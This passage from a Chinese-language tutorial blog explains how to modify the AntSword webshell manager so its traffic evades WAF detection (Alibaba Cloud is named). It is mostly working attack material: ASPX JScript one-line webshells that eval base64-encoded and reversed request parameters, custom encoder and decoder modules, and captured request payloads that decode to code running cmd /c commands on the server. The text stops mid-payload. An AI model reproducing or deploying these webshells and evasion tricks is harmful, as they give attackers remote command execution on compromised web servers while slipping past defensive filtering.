eval(base64Decode(StrReverse(expression)))</span><br></pre></td></tr></table></figure><p>这里这个马是过阿里云的，我感觉是阿里云因为是语义检测嘛，然后这个马报500，所以直接就过了<br>能用的</p><h4 id="antsword-aspx改造"><a href="#antsword-aspx改造" class="headerlink" title="antsword-aspx改造"></a>antsword-aspx改造</h4><h5 id="1-前置知识-1"><a href="#1-前置知识-1" class="headerlink" title="1.前置知识"></a>1.前置知识</h5><p>ASP（Active Server Pages）与ASPX（Active Server Pages Extended）之间存在一些区别和联系。让我们来详细了解它们之间的关系：</p><ol><li><strong>ASP（Active Server Pages）</strong>：<ul><li>ASP是Microsoft开发的一种服务器端脚本技术，用于动态生成网页内容。</li><li>ASP使用VBScript或JScript等脚本语言，与HTML混合在一起，通过服务器解释器（如IIS）解释执行脚本。</li><li>ASP文件的扩展名为 <code>.asp</code>。</li></ul></li><li><strong>ASPX（Active Server Pages Extended）</strong>：<ul><li>ASPX是ASP.NET的一部分，是ASP.NET网页的文件扩展名。</li><li>ASPX文件是基于XML的，使用ASP.NET框架来生成和处理动态网页内容。</li><li>ASPX文件可以包含HTML、服务器控件、服务器代码（如C#或VB.NET）等内容，通过ASP.NET引擎进行编译和执行。</li><li>ASPX文件的扩展名为 <code>.aspx</code>。</li></ul></li></ol><p><strong>关系</strong>：</p><ul><li>ASPX可以看作是对ASP的扩展和升级，它是ASP.NET框架下的一种技术。</li><li>ASPX技术使用了更强大的编程语言（如C#、VB.NET），并且采用了ASP.NET的开发模型、控件和框架，具有更好的性能、安全性和扩展性。</li><li>ASP.NET引擎可以同时处理ASP和ASPX文件，但它们之间的工作原理和实现方式有所不同。</li></ul><p>总的来说，ASP和ASPX都是用于生成动态网页内容的技术，但ASPX是ASP.NET技术的一部分，采用了更现代化、强大的开发模型和语言，更适合开发大型、复杂的Web应用程序。选择ASP还是ASPX取决于项目需求、开发团队技术栈和预期的性能和功能要求。</p><p>ASP（Active Server Pages）和ASP.NET（Active Server Pages.NET）是两种不同的Web开发技术，具有一些重要的区别。</p><ol><li><strong>语言和技术</strong>：<ul><li><strong>ASP</strong>：ASP使用VBScript或JScript等脚本语言来编写服务器端代码。它是经典的ASP技术，采用类似于HTML的语法，与前端的HTML混合在一起，并且没有严格的代码分层结构。</li><li><strong>ASP.NET</strong>：ASP.NET采用更强大的编程语言，如C#、VB.NET等，并且提供了更完善的开发框架。它使用.NET平台，具有更强大的功能和更好的性能优化。</li></ul></li><li><strong>开发模型</strong>：<ul><li><strong>ASP</strong>：ASP采用经典的脚本式开发模型，即在页面中嵌入脚本代码与HTML混合，代码和设计混合在一起。</li><li><strong>ASP.NET</strong>：ASP.NET采用分离式的开发模型，使用代码分离的方式，将逻辑代码与UI代码分离开来，通过代码文件和UI文件分别管理。</li></ul></li><li><strong>性能</strong>：<ul><li><strong>ASP</strong>：ASP的性能相对较低，因为它是基于脚本语言执行的，并且没有进行强大的编译优化。</li><li><strong>ASP.NET</strong>：ASP.NET采用编译型语言（如C#、VB.NET），并且在运行时进行了强大的编译和优化，因此具有更好的性能和扩展性。</li></ul></li><li><strong>状态管理</strong>：<ul><li><strong>ASP</strong>：ASP中的状态管理相对简单，使用Session和Cookie等技术来管理状态。</li><li><strong>ASP.NET</strong>：ASP.NET提供了更多的状态管理选项，如ViewState、Session、Cookies、Application等，并且提供了更灵活的缓存管理。</li></ul></li><li><strong>安全性</strong>：<ul><li><strong>ASP</strong>：ASP相对较为简单，安全性取决于开发者自行处理，容易出现安全漏洞。</li><li><strong>ASP.NET</strong>：ASP.NET提供了更多的安全性特性和机制，如表单认证、角色管理、加密技术等，提高了Web应用的安全性。</li></ul></li><li><strong>框架和控件</strong>：<ul><li><strong>ASP</strong>：ASP相对简单，没有丰富的开发框架和现成的控件库，开发者需要自行实现各种功能。</li><li><strong>ASP.NET</strong>：ASP.NET拥有强大的开发框架和丰富的控件库，如ASP.NET MVC、ASP.NET Web Forms等，提供了大量现成的控件和功能模块，方便快速开发。</li></ul></li></ol><p>总的来说，ASP.NET相比ASP具有更强大的功能、更好的性能和更高的安全性，适合开发大型和复杂的Web应用程序。而ASP更适合简单的Web页面或小型项目。选择ASP还是ASP.NET取决于项目的需求、开发团队的技术栈以及预期的性能和安全性要求。</p><p>笔者这里搭建了asp的环境，但是直接能用aspx的木马。</p><h5 id="2-asp编码器"><a href="#2-asp编码器" class="headerlink" title="2.asp编码器"></a>2.asp编码器</h5><p>老规矩，先看木马<br><code>&lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</code></p><p>很简单的一句话，声明和eval执行即可<br>那么我们编码还是老样子，先进行base64编码</p><p>先看下原本的payload</p><p><img src="/images/antsword-bypasswaf/image-20240403141207211.png" alt="image-20240403141207211"></p><p>添加编码器</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * aspx::base64编码器</span></span><br><span class="line"><span class="comment"> * Create at: 2024/04/03 14:12:58</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @param  &#123;String&#125; pwd   连接密码</span></span><br><span class="line"><span class="comment">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span></span><br><span class="line"><span class="comment">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">pwd, data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//data[pwd] = Buffer.from(data[&#x27;_&#x27;]).toString(&#x27;base64&#x27;).split(&#x27;&#x27;).reverse().join(&#x27;&#x27;);</span></span><br><span class="line">  <span class="comment">// shell 在接收到 payload 后，先处理 pwd 参数下的内容，</span></span><br><span class="line">  data[pwd] = Buffer.from(data[<span class="string">&#x27;_&#x27;</span>]).toString(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">  <span class="comment">// ##########    请在上方编写你自己的代码   ###################</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 删除 _ 原有的payload</span></span><br><span class="line">  <span class="keyword">delete</span> data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">  <span class="comment">// 返回编码器处理后的 payload 数组</span></span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>那么相应的我们的马要进行base64解码</p><p>aspx接收 jscript c# c 等语言，好像冰蝎是c#的<br>蚁剑的，一般短点的是jscript，不能代表全部</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">var a=&#x27;efasnu&#x27;;</span><br><span class="line">var c=a(5)+a(4)+a(3)+a(2)+a(1)+a(0);</span><br><span class="line">try &#123;</span><br><span class="line">var data = Request.Item[&quot;a&quot;];</span><br><span class="line">var bytes = System.Convert.FromBase64String(data);</span><br><span class="line">var decodedText = System.Text.Encoding.UTF8.GetString(bytes);</span><br><span class="line">eval(decodedText,c);</span><br><span class="line">&#125; catch (ex) &#123;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先不用免杀，能用就行<br>先将传递过来的数据进行解码，然后传给eval</p><p><img src="/images/antsword-bypasswaf/image-20240407092418601.png" alt="image-20240407092418601"></p><p><img src="/images/antsword-bypasswaf/image-20240407092440159.png" alt="image-20240407092440159"></p><p>就可以实现了</p><p>接下来实现逆序的编码器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * aspx::base64编码器</span><br><span class="line"> * Create at: 2024/04/03 14:12:58</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">&#x27;use strict&#x27;;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">* @param  &#123;String&#125; pwd   连接密码</span><br><span class="line">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span><br><span class="line">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span><br><span class="line">*/</span><br><span class="line">module.exports = (pwd, data, ext=&#123;&#125;) =&gt; &#123;</span><br><span class="line"></span><br><span class="line">  data[pwd] = Buffer.from(data[&#x27;_&#x27;]).toString(&#x27;base64&#x27;).split(&#x27;&#x27;).reverse().join(&#x27;&#x27;);</span><br><span class="line">  // shell 在接收到 payload 后，先处理 pwd 参数下的内容，</span><br><span class="line">  //data[pwd] = Buffer.from(data[&#x27;_&#x27;]).toString(&#x27;base64&#x27;);</span><br><span class="line">  // ##########    请在上方编写你自己的代码   ###################</span><br><span class="line"></span><br><span class="line">  // 删除 _ 原有的payload</span><br><span class="line">  delete data[&#x27;_&#x27;];</span><br><span class="line">  // 返回编码器处理后的 payload 数组</span><br><span class="line">  return data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">var a=&#x27;efasnu&#x27;;</span><br><span class="line">var c=a(5)+a(4)+a(3)+a(2)+a(1)+a(0);</span><br><span class="line">try &#123;</span><br><span class="line">var c = Request.Item[&quot;a&quot;];</span><br><span class="line">var data = c.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;);</span><br><span class="line">var bytes = System.Convert.FromBase64String(data);</span><br><span class="line">var decodedText = System.Text.Encoding.UTF8.GetString(bytes);</span><br><span class="line">eval(decodedText,c);</span><br><span class="line">&#125; catch (ex) &#123;</span><br><span class="line">    // 不执行任何输出操作，即使有异常也不输出到页面上</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里就更改了一行，就行,逆序一下<br>看下效果<br><img src="/images/antsword-bypasswaf/image-20240407094224598.png" alt="image-20240407094224598"></p><p><img src="/images/antsword-bypasswaf/image-20240407094233967.png" alt="image-20240407094233967"></p><h5 id="3-aspx解码器"><a href="#3-aspx解码器" class="headerlink" title="3.aspx解码器"></a>3.aspx解码器</h5><p>参考<a href="https://www.youncyb.cn/?p=700">https://www.youncyb.cn/?p=700</a></p><p>好，看完编码器，看下解码器。<br>这里又要研究源码了</p><p><img src="/images/antsword-bypasswaf/image-20240407094532267.png" alt="image-20240407094532267"></p><p>对解码器的理解，主要看这一段，<br>这一段，并没有预留解码器的变量<br>我们要去php的index.js中扣一段，<br><img src="/images/antsword-bypasswaf/image-20240407095256423.png" alt="image-20240407095256423"></p><p>也就是asencode那里，<br><img src="/images/antsword-bypasswaf/image-20240407155618044.png" alt="image-20240407155618044"></p><p>在aspx中的index.js中给他加上。<br>第二部<br>将data[‘_’]换掉，换成</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data[<span class="string">&#x27;_&#x27;</span>] = <span class="string">`Response.Write(&quot;<span class="subst">$&#123;tag_s.substr(<span class="number">0</span>,tag_s.length<span class="regexp">/2)&#125;&quot;+&quot;$&#123;tag_s.substr(tag_s.length/</span><span class="number">2</span>)&#125;</span>&quot;);<span class="subst">$&#123;asencCode&#125;</span>;var err:Exception;try&#123;eval(&quot;var opcode=&#x27;&#x27;;&quot; + System.Text.Encoding.GetEncoding(&quot;<span class="subst">$&#123;aspxencode&#125;</span>&quot;).GetString(System.Convert.FromBase64String(&quot;<span class="subst">$&#123;base64Code&#125;</span>&quot;)) + &quot;;Response.Write(asenc(opcode));&quot;,&quot;unsafe&quot;);&#125;catch(err)&#123;Response.Write(asenc(&quot;ERROR:// &quot;+err.message));&#125;Response.Write(&quot;<span class="subst">$&#123;tag_e.substr(<span class="number">0</span>,tag_e.length<span class="regexp">/2)&#125;&quot;+&quot;$&#123;tag_e.substr(tag_e.length/</span><span class="number">2</span>)&#125;</span>&quot;);Response.End();`</span>;</span><br></pre></td></tr></table></figure><p>解释一下什么意思，上面说了，aspx并没有预留对应的asencCode，所以我们自己加上，放在payload中，接下来定义一个变量，用于接受功能执行的结果，最后输出的时候会先调用asenc函数，</p><p><img src="/images/antsword-bypasswaf/image-20240407160002646.png" alt="image-20240407160002646"></p><p>这个asenc函数的定义，就是我们自己想定义的输出内容了，这里先进行base64即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function asenc(opcode)&#123;</span><br><span class="line">    var bytesToEncode = System.Text.Encoding.UTF8.GetBytes(opcode);</span><br><span class="line">    return System.Convert.ToBase64String(bytesToEncode);</span><br></pre></td></tr></table></figure><p>第三步，最关键的，改源码</p><p>先了解一下，当我们在蚁剑中执行dir的时候，是怎么样发包的<br><img src="/images/antsword-bypasswaf/image-20240407160823986.png" alt="image-20240407160823986"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Response.Write(%2208a827%22%2B%223d2565%22)%3Bfunction%20asenc(opcode)%7Bvar%20bytesToEncode%20%3D%20System.Text.Encoding.UTF8.GetBytes(opcode)%3Breturn%20System.Convert.ToBase64String(bytesToEncode)%3B%0A%7D%3Bvar%20err%3AException%3Btry%7Beval(%22var%20opcode%3D&#x27;&#x27;%3B%22%20%2B%20System.Text.Encoding.GetEncoding(%22UTF-8%22).GetString(System.Convert.FromBase64String(%22dmFyIGM9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvKFN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKCJVVEYtOCIpLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKFJlcXVlc3QuSXRlbVsidTRlODQ2MjJjOTFjNWQiXS5zdWJzdHIoMikpKSk7dmFyIGU9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzKCk7dmFyIG91dDpTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyLEVJOlN5c3RlbS5JTy5TdHJlYW1SZWFkZXI7Yy5Vc2VTaGVsbEV4ZWN1dGU9ZmFsc2U7Yy5SZWRpcmVjdFN0YW5kYXJkT3V0cHV0PXRydWU7Yy5SZWRpcmVjdFN0YW5kYXJkRXJyb3I9dHJ1ZTtlLlN0YXJ0SW5mbz1jO2MuQXJndW1lbnRzPSIvYyAiK1N5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKCJVVEYtOCIpLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKFJlcXVlc3QuSXRlbVsiaDkzZWQyMDA4NTlkYTIiXS5zdWJzdHIoMikpKTtpZihSZXF1ZXN0Lkl0ZW1bImc4ZTkxYzJkZjIwYjM0Il0uc3Vic3RyKDIpKSB7dmFyIGVudnN0ciA9IFN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKCJVVEYtOCIpLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKFJlcXVlc3QuSXRlbVsiZzhlOTFjMmRmMjBiMzQiXS5zdWJzdHIoMikpKTt2YXIgZW52YXJyID0gZW52c3RyLnNwbGl0KCJ8fHxhc2xpbmV8fHwiKTt2YXIgaTtmb3IgKHZhciBpIGluIGVudmFycikge3ZhciBzcyA9IGVudmFycltpXS5zcGxpdCgifHx8YXNrZXl8fHwiKTtpZiAoc3MubGVuZ3RoICE9IDIpIHtjb250aW51ZTt9Yy5FbnZpcm9ubWVudFZhcmlhYmxlcy5BZGQoc3NbMF0sc3NbMV0pO319ZS5TdGFydCgpO291dD1lLlN0YW5kYXJkT3V0cHV0O0VJPWUuU3RhbmRhcmRFcnJvcjtlLkNsb3NlKCk7b3Bjb2RlICs9b3V0LlJlYWRUb0VuZCgpICsgRUkuUmVhZFRvRW5kKCk7%22))%20%2B%20%22%3BResponse.Write(asenc(opcode))%3B%22%2C%22unsafe%22)%3B%7Dcatch(err)%7BResponse.Write(asenc(%22ERROR%3A%2F%2F%20%22%2Berr.message))%3B%7DResponse.Write(%226d295%22%2B%22b1d88d%22)%3BResponse.End()%3B</span><br></pre></td></tr></table></figure><p>bp这样发包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=Response.Write(%2208a827%22%2B%223d2565%22)%3Bfunction%20asenc(opcode)%7Bvar%20bytesToEncode%20%3D%20System.Text.Encoding.UTF8.GetBytes(opcode)%3Breturn%20System.Convert.ToBase64String(bytesToEncode)%3B%0A%7D%3Bvar%20err%3AException%3Btry%7Beval(%22var%20opcode%3D&#x27;&#x27;%3B%22%20%2B%20System.Text.Encoding.GetEncoding(%22UTF-8%22).GetString(System.Convert.FromBase64String(%22dmFyIGM9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvKFN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKCJVVEYtOCIpLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKFJlcXVlc3QuSXRlbVsidTRlODQ2MjJjOTFjNWQiXS5zdWJzdHIoMikpKSk7dmFyIGU9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzKCk7dmFyIG91dDpTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyLEVJOlN5c3RlbS5JTy5TdHJlYW1SZWFkZXI7Yy5Vc2VTaGVsbEV4ZWN1dGU9ZmFsc2U7Yy5SZWRpcmVjdFN0YW5kYXJkT3V0cHV0PXRydWU7Yy5SZWRpcmVjdFN0YW5kYXJkRXJyb3I9dHJ1ZTtlLlN0YXJ0SW5mbz1jO2MuQXJndW1lbnRzPSIvYyAiK1N5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKCJVVEYtOCIpLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKFJlcXVlc3QuSXRlbVsiaDkzZWQyMDA4NTlkYTIiXS5zdWJzdHIoMikpKTtpZihSZXF1ZXN0Lkl0ZW1bImc4ZTkxYzJkZjIwYjM0Il0uc3Vic3RyKDIpKSB7dmFyIGVudnN0ciA9IFN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKCJVVEYtOCIpLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKFJlcXVlc3QuSXRlbVsiZzhlOTFjMmRmMjBiMzQiXS5zdWJzdHIoMikpKTt2YXIgZW52YXJyID0gZW52c3RyLnNwbGl0KCJ8fHxhc2xpbmV8fHwiKTt2YXIgaTtmb3IgKHZhciBpIGluIGVudmFycikge3ZhciBzcyA9IGVudmFycltpXS5zcGxpdCgifHx8YXNrZXl8fHwiKTtpZiAoc3MubGVuZ3RoICE9IDIpIHtjb250aW51ZTt9Yy5FbnZpcm9ubWVudFZhcmlhYmxlcy5BZGQoc3NbMF0sc3NbMV0pO319ZS5TdGFydCgpO291dD1lLlN0YW5kYXJkT3V0cHV0O0VJPWUuU3RhbmRhcmRFcnJvcjtlLkNsb3NlKCk7b3Bjb2RlICs9b3V0LlJlYWRUb0VuZCgpICsgRUkuUmVhZFRvRW5kKCk7%22))%20%2B%20%22%3BResponse.Write(asenc(opcode))%3B%22%2C%22unsafe%22)%3B%7Dcatch(err)%7BResponse.Write(asenc(%22ERROR%3A%2F%2F%20%22%2Berr.message))%3B%7DResponse.Write(%226d295%22%2B%22b1d88d%22)%3BResponse.End()%3B&amp;g8e91c2df20b34=dU&amp;h93ed200859da2=k3Y2QgL2QgIkM6L2FzcC9hc3B4IiZkaXImZWNobyAzNjA4YjkmY2QmZWNobyAwODkzYjQxZWUwOQ%3D%3D&amp;u4e84622c91c5d=hOY21k</span><br></pre></td></tr></table></figure><p>可以看到System.Convert.FromBase64String的值是经过base64的，解一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var c=new System.Diagnostics.ProcessStartInfo(System.Text.Encoding.GetEncoding(&quot;UTF-8&quot;).GetString(System.Convert.FromBase64String(Request.Item[&quot;u4e84622c91c5d&quot;].substr(2))));var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments=&quot;/c &quot;+System.Text.Encoding.GetEncoding(&quot;UTF-8&quot;).GetString(System.Convert.FromBase64String(Request.Item[&quot;h93ed200859da2&quot;].substr(2)));if(Request.Item[&quot;g8e91c2df20b34&quot;].substr(2)) &#123;var envstr = System.Text.Encoding.GetEncoding(&quot;UTF-8&quot;).GetString(System.Convert.FromBase64String(Request.Item[&quot;g8e91c2df20b34&quot;].substr(2)));var envarr = envstr.split(&quot;|||asline|||&quot;);var i;for (var i in envarr) &#123;var ss = envarr[i].split(&quot;|||askey|||&quot;);if (ss.length != 2) &#123;continue;&#125;c.EnvironmentVariables.Add(ss[0],ss[1]);&#125;&#125;e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd() + EI.ReadToEnd());</span><br></pre></td></tr></table></figure><p>看到这里，都是一些Request.Item，<br><img src="/images/antsword-bypasswaf/image-20240407161139261.png" alt="image-20240407161139261"></p><p>将h93ed200859da2的值进行去2在base64，就是执行了dir了。<br>然后将h93ed200859da2的值赋值给了out，</p><p>然后用Response.Write输出。<br>这里它直接输出了结果，那么肯定编码不到base64了<br>我们要将每一个功能点进行将结果的值赋值给上面我们定义的变量，<br>先改命令执行的，和info的（测试连接的）<br>命令执行在command.js自己中</p><p><img src="/images/antsword-bypasswaf/image-20240407161535913.png" alt="image-20240407161535913"></p><p>改成<code>opcode +=out.ReadToEnd() + EI.ReadToEnd();</code></p><p><img src="/images/antsword-bypasswaf/image-20240407161715977.png" alt="image-20240407161715977"></p><p>那么此时再次进行dir的时候就会有asenc函数，asenc函数将qrcodebase64编码，然后reture就可以了<br>我们的解码器为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * aspx::base64解码器</span><br><span class="line"> * Create at: 2024/04/07 09:56:32</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">&#x27;use strict&#x27;;</span><br><span class="line"></span><br><span class="line">module.exports = &#123;</span><br><span class="line">  /**</span><br><span class="line">   * @returns &#123;string&#125; asenc 将返回数据base64编码</span><br><span class="line">   * 自定义输出函数名称必须为 asenc</span><br><span class="line">   * 该函数使用的语法需要和shell保持一致</span><br><span class="line">   */</span><br><span class="line">  asoutput: () =&gt; &#123;</span><br><span class="line">    return `function asenc(opcode)&#123;</span><br><span class="line">    var bytesToEncode = System.Text.Encoding.UTF8.GetBytes(opcode);</span><br><span class="line">    return System.Convert.ToBase64String(bytesToEncode);</span><br><span class="line">&#125;</span><br><span class="line">    `.replace(/\n\s+/g, &#x27;&#x27;);</span><br><span class="line">  &#125;,</span><br><span class="line">  /**</span><br><span class="line">   * 解码 Buffer</span><br><span class="line">   * @param &#123;string&#125; data 要被解码的 Buffer</span><br><span class="line">   * @returns &#123;string&#125; 解码后的 Buffer</span><br><span class="line">   */</span><br><span class="line">  decode_buff: (data, ext=&#123;&#125;) =&gt; &#123;</span><br><span class="line">    return Buffer.from(data.toString(), &#x27;base64&#x27;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后试一下，改完源码要重启蚁剑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=Response.Write(&quot;a3&quot;+&quot;7b3&quot;);function asenc(opcode)&#123;var bytesToEncode = System.Text.Encoding.UTF8.GetBytes(opcode);return System.Convert.ToBase64String(bytesToEncode);</span><br><span class="line">&#125;;var err:Exception;try&#123;eval(&quot;var opcode=&#x27;&#x27;;&quot; + System.Text.Encoding.GetEncoding(&quot;UTF-8&quot;).GetString(System.Convert.FromBase64String(&quot;dmFyIGM9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvKFN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKCJVVEYtOCIpLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKFJlcXVlc3QuSXRlbVsidTRlODQ2MjJjOTFjNWQiXS5zdWJzdHIoMikpKSk7dmFyIGU9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzKCk7dmFyIG91dDpTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyLEVJOlN5c3RlbS5JTy5TdHJlYW1SZWFkZXI7Yy5Vc2VTaGVsbEV4ZWN1dGU9ZmFsc2U7Yy5SZWRpcmVjdFN0YW5kYXJkT3V0cHV0PXRydWU7Yy5SZWRpcmVjdFN0YW5kYXJkRXJyb3I9dHJ1ZTtlLlN0YXJ0SW5mbz1jO2MuQXJndW1lbnRzPSIvYyAiK1N5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKCJVVEYtOCIpLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKFJlcXVlc3QuSXRlbVsiaDkzZWQyMDA4NTlkYTIiXS5zdWJzdHIoMikpKTtpZihSZXF1ZXN0Lkl0ZW1bImc4ZTkxYzJkZjIwYjM0Il0uc3Vic3RyKDIpKSB7dmFyIGVudnN0ciA9IFN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKCJVVEYtOCIpLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKFJlcXVlc3QuSXRlbVsiZzhlOTFjMmRmMjBiMzQiXS5zdWJzdHIoMikpKTt2YXIgZW52YXJyID0gZW52c3RyLnNwbGl0KCJ8fHxhc2xpbmV8fHwiKTt2YXIgaTtmb3IgKHZhciBpIGluIGVudmFycikge3ZhciBzcyA9IGVudmFycltpXS5zcGxpdCgifHx8YXNrZXl8fHwiKTtpZiAoc3MubGVuZ3RoICE9IDIpIHtjb250aW51ZTt9Yy5FbnZpcm9ubWVudFZhcmlhYmxlcy5BZGQoc3NbMF0sc3NbMV0pO319ZS5TdGFydCgpO291dD1lLlN0YW5kYXJkT3V0cHV0O0VJPWUuU3RhbmRhcmRFcnJvcjtlLkNsb3NlKCk7b3Bjb2RlICs9b3V0LlJlYWRUb0VuZCgpICsgRUkuUmVhZFRvRW5kKCk7&quot;)) + &quot;;Response.Write(asenc(opcode));&quot;,&quot;unsafe&quot;);&#125;catch(err)&#123;Response.Write(asenc(&quot;ERROR:// 